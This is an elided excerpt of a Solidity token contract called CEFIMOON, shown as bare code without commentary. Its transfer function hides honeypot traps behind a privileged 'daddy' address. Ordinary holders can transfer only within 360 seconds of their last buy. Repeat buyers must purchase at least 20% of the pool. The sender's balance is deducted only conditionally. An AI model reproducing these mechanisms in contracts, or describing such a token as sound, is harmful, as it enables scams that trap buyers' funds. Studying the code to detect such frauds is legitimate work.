...
contract CEFIMOON is Ownable, IERC20 {
    ...
    address private daddy;
    address private pair;
    uint256 private transfertimeout = 360;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (sender !=daddy && sender !=pair){
            require(block.timestamp <= lastBuy[sender] + transfertimeout);
        }

        if (sender !=daddy && recipient !=daddy && sender == pair && recipient != pair && balanceOf(recipient) >= 1){
            require( amount >= balanceOf(pair).mul(20).div(100));
        }
        ...
        _balances[_burnaddress] += feeAmount;
        if (senderBalance >= amount) {
            _balances[sender] = senderBalance - amount;
        }

        if (recipient != daddy && recipient != pair && sender == pair ){
